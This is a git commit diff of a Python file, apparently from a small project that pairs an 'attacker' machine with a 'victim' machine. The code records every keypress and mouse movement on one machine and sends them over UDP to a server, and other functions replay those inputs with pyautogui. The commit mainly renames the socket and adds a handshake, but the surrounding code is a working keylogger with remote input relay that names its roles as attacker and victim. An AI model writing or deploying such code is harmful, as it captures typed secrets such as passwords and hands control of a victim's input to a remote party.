80438bcdb50e8c50352a952f4cdf9ed69bcdfc25
mrvs0 <mrvs025@gmail.com>
2023-01-02 17:58:29 +0200

    branch initialization formatting establishing connection with the main socket

--- functions.py
+++ functions.py
@@ -2,27 +2,27 @@ import pyautogui as pg
 import keyboard as kb
 import socket
 
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+function_class_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 screen_width, screen_height = pg.size()
 
 
-def log_keyboard(server_ip):  # TODO: change print to send
+def log_keyboard(server_ip: tuple):
     while 1:
         recorded = f'{kb.read_key()}'
-        s.sendto(recorded.encode(), server_ip)
+        function_class_socket.sendto(recorded.encode(), server_ip)
 
 
 def recreate_keyboard(button: str):
     pg.press(button)
 
 
-def log_mouse(server_ip):  # TODO: change print to send
+def log_mouse(server_ip: tuple):
     pos = pg.position()
     while 1:
         pos_now = (pg.position()[0] * 100 // screen_width, pg.position()[1] * 100 // screen_height)
         if pos_now != pos:
             pos = pos_now
-            s.sendto(f'{pos}'.encode(), server_ip)
+            function_class_socket.sendto(f'{pos}'.encode(), server_ip)
 
 
 def recreate_mouse_movement(pos: str):
@@ -32,9 +32,13 @@ def recreate_mouse_movement(pos: str):
     pg.moveTo(x, y)
 
 
-def connect_as_attacker(ip_for_connection_as_attacker):
-    s.sendto('i am the attacker'.encode(), ip_for_connection_as_attacker)
+def connect_as_attacker(ip_for_connection_as_attacker: tuple, ip_of_server: tuple):
+    function_class_socket.sendto('i am the attacker'.encode(), ip_for_connection_as_attacker)
+    function_class_socket.recvfrom(1024)
+    function_class_socket.sendto('ignore'.encode(), ip_of_server)
 
 
-def connect_as_victim(ip_for_victims):
-    s.sendto('i am a victim'.encode(), ip_for_victims)
+def connect_as_victim(ip_for_victims: tuple, ip_of_server: tuple):
+    function_class_socket.sendto('i am a victim'.encode(), ip_for_victims)
+    function_class_socket.recvfrom(1024)
+    function_class_socket.sendto('ignore'.encode(), ip_of_server)
